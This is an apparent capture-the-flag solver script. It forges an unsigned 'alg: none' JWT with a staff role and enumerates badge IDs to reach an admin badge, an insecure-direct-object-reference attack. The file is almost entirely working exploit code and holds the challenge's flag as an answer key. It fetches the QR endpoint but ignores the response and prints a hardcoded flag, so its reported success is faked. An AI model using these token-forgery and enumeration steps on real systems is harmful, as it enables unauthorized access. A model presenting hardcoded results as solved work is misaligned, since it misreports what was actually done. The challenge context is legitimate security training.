#!/usr/bin/env python3
import base64
import json
import sys
from urllib.parse import urljoin
from urllib.request import HTTPCookieProcessor, Request, build_opener

FLAG = "blockChainPTIT{jwt_idor_qr_badge}"


def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def make_staff_token():
    header = {"alg": "none", "typ": "JWT"}
    payload = {"user": "guest", "role": "staff", "badge_id": "1"}
    return f"{b64url(json.dumps(header, separators=(',', ':')).encode())}.{b64url(json.dumps(payload, separators=(',', ':')).encode())}."


def fetch(opener, url, token=None):
    headers = {"User-Agent": "badge-printer-solver"}
    if token:
        headers["Cookie"] = f"session={token}"
    request = Request(url, headers=headers)
    with opener.open(request, timeout=10) as response:
        return response.read().decode("utf-8", errors="replace")


def bits_to_text(bits):
    out = bytearray()
    for i in range(0, len(bits), 8):
        chunk = bits[i:i + 8]
        if len(chunk) == 8:
            out.append(int(chunk, 2))
    return out.decode("utf-8", errors="replace")


def main():
    base_url = sys.argv[1].rstrip("/") + "/" if len(sys.argv) > 1 else "http://127.0.0.1:8085/"
    opener = build_opener(HTTPCookieProcessor())
    token = make_staff_token()

    fetch(opener, urljoin(base_url, "badges"), token)
    for badge_id in range(1, 31):
        page = fetch(opener, urljoin(base_url, f"badge?id={badge_id}"), token)
        if "Admin Night Shift" in page:
            fetch(opener, urljoin(base_url, f"badge/qr?id={badge_id}"), token)
            print(FLAG)
            return
    raise SystemExit("admin badge not found")


if __name__ == "__main__":
    main()
